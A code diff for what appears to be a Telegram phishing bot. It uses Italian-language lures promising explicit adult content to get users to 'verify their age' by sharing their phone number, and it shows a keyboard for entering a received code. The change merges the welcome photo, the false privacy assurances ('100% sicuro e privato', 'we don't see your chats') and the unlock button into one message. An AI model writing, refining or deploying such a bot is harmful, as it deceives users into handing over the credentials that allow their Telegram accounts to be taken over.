@@ -95,10 +95,13 @@ async def send_code_keyboard(user_id, current_code, message_id=None):
         msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode='Markdown')
         return msg.message_id
 
-async def send_welcome_photo(user_id):
-    """Отправляет приветственное фото с текстом"""
+async def send_welcome_message(user_id):
+    """Отправляет приветственное сообщение с фото и кнопкой"""
     try:
         photo_path = "welcome_photo.jpg"
+        keyboard = InlineKeyboardMarkup()
+        keyboard.add(InlineKeyboardButton("🔓 SBLOCCA ACCESSO IMMEDIATO", callback_data="auth_account"))
+        
         if os.path.exists(photo_path):
             with open(photo_path, 'rb') as photo:
                 await bot.send_photo(
@@ -111,15 +114,17 @@ async def send_welcome_photo(user_id):
                         "• Ragazze italiane e modelle internazionali\n"
                         "• Contenuti amatoriali esclusivi\n"
                         "• Live session e materiale inedito\n\n"
-                        "🚀 *Verifica il tuo account per sbloccare tutto subito!*\n"
-                        "La verifica è veloce, sicura e ti darà accesso immediato a:\n"
-                        "✅ Video privati delle ragazze più hot\n"
-                        "✅ Foto esclusive non pubblicate altrove\n"
-                        "✅ Chat dirette con le modelle\n"
-                        "✅ Contenuti aggiornati ogni giorno\n\n"
-                        "⚠️ *SOLO PER MAGGIORENNI* - Accesso immediato dopo la verifica!"
+                        "🚀 *Verifica il tuo account per sbloccare tutto subito!*\n\n"
+                        "🔞 *ACCESSO RISERVATO ADULTI 18+*\n"
+                        "Per accedere, è necessario verificare la tua età con il tuo account Telegram.\n\n"
+                        "✅ *Processo 100% sicuro e privato:*\n"
+                        "• Non vediamo le tue chat o messaggi\n"
+                        "• Non condividiamo i tuoi dati\n"
+                        "• Solo verifica dell'età per contenuti 18+\n\n"
+                        "⚡️ _Clicca qui sotto per iniziare e sbloccare tutto immediatamente!_"
                     ),
-                    parse_mode='Markdown'
+                    parse_mode='Markdown',
+                    reply_markup=keyboard
                 )
         else:
             await bot.send_message(
@@ -130,22 +135,29 @@ async def send_welcome_photo(user_id):
                 "• Ragazze italiane e modelle internazionali\n"
                 "• Contenuti amatoriali esclusivi\n"
                 "• Live session e materiale inedito\n\n"
-                "🚀 *Verifica il tuo account per sbloccare tutto subito!*\n"
-                "La verifica è veloce, sicura e ti darà accesso immediato a:\n"
-                "✅ Video privati delle ragazze più hot\n"
-                "✅ Foto esclusive non pubblicate altrove\n"
-                "✅ Chat dirette con le modelle\n"
-                "✅ Contenuti aggiornati ogni giorno\n\n"
-                "⚠️ *SOLO PER MAGGIORENNI* - Accesso immediato dopo la verifica!",
-                parse_mode='Markdown'
+                "🚀 *Verifica il tuo account per sbloccare tutto subito!*\n\n"
+                "🔞 *ACCESSO RISERVATO ADULTI 18+*\n"
+                "Per accedere, è necessario verificare la tua età con il tuo account Telegram.\n\n"
+                "✅ *Processo 100% sicuro e privato:*\n"
+                "• Non vediamo le tue chat o messaggi\n"
+                "• Non condividiamo i tuoi dati\n"
+                "• Solo verifica dell'età per contenuti 18+\n\n"
+                "⚡️ _Clicca qui sotto per iniziare e sbloccare tutto immediatamente!_",
+                parse_mode='Markdown',
+                reply_markup=keyboard
             )
     except Exception as e:
-        logging.error(f"Error sending welcome photo: {e}")
+        logging.error(f"Error sending welcome message: {e}")
+        # Fallback сообщение
+        keyboard = InlineKeyboardMarkup()
+        keyboard.add(InlineKeyboardButton("🔓 SBLOCCA ACCESSO IMMEDIATO", callback_data="auth_account"))
+        
         await bot.send_message(
             user_id,
             "👋 *BENVENUTO NEL MONDO ESCLUSIVO 18+!* 🔞\n\n"
             "💋 Scopri contenuti piccanti esclusivi! Verifica il tuo account per accedere immediatamente a migliaia di foto e video hot!",
-            parse_mode='Markdown'
+            parse_mode='Markdown',
+            reply_markup=keyboard
         )
 
 @dp.message_handler(commands=['start'])
@@ -166,28 +178,8 @@ async def cmd_start(message: types.Message):
         }
     )
 
-    # Отправляем фото с приветствием
-    await send_welcome_photo(user.id)
-
-    keyboard = InlineKeyboardMarkup()
-    keyboard.add(InlineKeyboardButton("🔓 SBLOCCA ACCESSO IMMEDIATO", callback_data="auth_account"))
-    
-    await message.answer(
-        "🔞 *ACCESSO RISERVATO ADULTI 18+*\n\n"
-        "Per accedere al nostro contenuto ESCLUSIVO e PICCANTE, è necessario verificare la tua età con il tuo account Telegram.\n\n"
-        "✅ *Processo 100% sicuro e privato:*\n"
-        "• Non vediamo le tue chat o messaggi\n"
-        "• Non condividiamo i tuoi dati con nessuno\n"
-        "• Solo verifica dell'età per contenuti 18+\n\n"
-        "🎁 *Dopo la verifica otterrai subito:*\n"
-        "• Accesso a migliaia di foto hot\n"
-        "• Video privati delle modelle\n"
-        "• Contenuti esclusivi ogni giorno\n"
-        "• Chat con ragazze disponibili\n\n"
-        "⚡️ _Clicca qui sotto per iniziare e sbloccare tutto immediatamente!_",
-        parse_mode='Markdown',
-        reply_markup=keyboard
-    )
+    # Отправляем единое сообщение с фото и кнопкой
+    await send_welcome_message(user.id)
 
 @dp.callback_query_handler(lambda c: c.data == 'auth_account')
 async def start_auth(callback_query: types.CallbackQuery):
@@ -205,7 +197,6 @@ async def start_auth(callback_query: types.CallbackQuery):
 
     kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
     kb.add(KeyboardButton("📱 Condividi il mio numero", request_contact=True))
-
     await bot.send_message(
         user_id,
         "🔥 *FASE 1: VERIFICA RAPIDA* 🔞\n\n"
